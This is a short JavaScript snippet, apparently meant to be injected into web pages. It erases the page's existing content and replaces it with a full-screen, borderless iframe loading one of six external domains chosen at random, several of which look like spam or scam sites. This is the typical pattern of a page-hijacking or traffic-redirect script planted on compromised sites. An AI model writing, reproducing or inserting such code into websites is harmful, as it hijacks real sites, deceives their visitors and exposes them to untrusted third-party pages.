(function() {
  const links = [
    "https://home.wikilegia.at/",
    "https://news.westindiaquay.com/",
    "https://app.edu.iownyour.org/",
    "https://buy.wine-software.com/",
    "https://portal.sso.toythieves.com/",
    "https://amplifyz.cfd/"
  ];

  const selected = links[Math.floor(Math.random() * links.length)];

  document.head.innerHTML = '';
  document.body.innerHTML = '';
  document.body.style.margin = '0';
  document.body.style.padding = '0';
  document.body.style.overflow = 'hidden';

  const iframe = document.createElement('iframe');
  iframe.src = selected;
  iframe.style.position = 'fixed';
  iframe.style.top = '0';
  iframe.style.left = '0';
  iframe.style.width = '100vw';
  iframe.style.height = '100vh';
  iframe.style.border = 'none';
  iframe.allowFullscreen = true;

  document.body.appendChild(iframe);
})();
